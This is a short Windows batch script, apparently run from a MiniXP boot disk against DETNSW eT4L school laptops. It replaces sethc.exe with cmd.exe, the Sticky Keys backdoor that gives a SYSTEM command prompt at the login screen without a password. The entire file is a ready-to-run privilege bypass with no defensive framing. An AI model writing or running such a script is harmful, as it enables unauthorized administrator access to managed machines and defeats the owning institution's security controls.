@echo off
title DETNSW eT4L Boot SETHC Patch Part 1 V1.0 MiniXP
cls
echo Patching Sethc
copy c:\windows\system32\sethc.exe c:\
copy /y c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe
cls
echo Done!
pause
exit